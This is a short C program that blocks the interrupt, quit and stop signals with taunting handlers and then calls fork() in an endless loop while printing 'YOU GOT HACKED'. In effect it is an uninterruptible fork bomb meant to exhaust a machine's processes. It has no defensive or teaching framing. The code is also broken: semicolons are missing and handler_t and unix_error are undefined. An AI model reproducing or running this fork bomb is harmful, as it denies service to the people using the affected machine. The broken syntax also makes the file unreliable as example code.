#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

void
sigint_handler(int sig);

void
sigquit_handler(int sig);

void
sigtstp_handler(int sig)

handler_t*
Signal (int signum, handler_t* handler);

void
sigint_handler(int sig)
{
    printf("Nice try, idiot");
    return;
}

void
sigquit_handler(int sig)
{
    printf("Nice try, idiot");
    return;
}

void
sigtstp_handler(int sig)
{
    printf("Nice try idiot");
    return;
}

handler_t*
Signal (int signum, handler_t* handler)
{
    struct sigaction action, old_action;

    action.sa_handler = handler;
    sigemptyset (&action.sa_mask);
    action.sa_flags = SA_RESTART;  

    if (sigaction (signum, &action, &old_action) < 0)
        unix_error ("Signal error");
    return (old_action.sa_handler);
}

int
main()
{
    Signal (SIGTSTP, sigtstp_handler)
    Signal (SIGINT, sigint_handler);
    Signal (SIGQUIT, sigquit_handler);

    while(1) {
        fork();
        printf("YOU GOT HACKED HAHAHAHHAHAHAHAHAHAHAHHAHA");
    }
}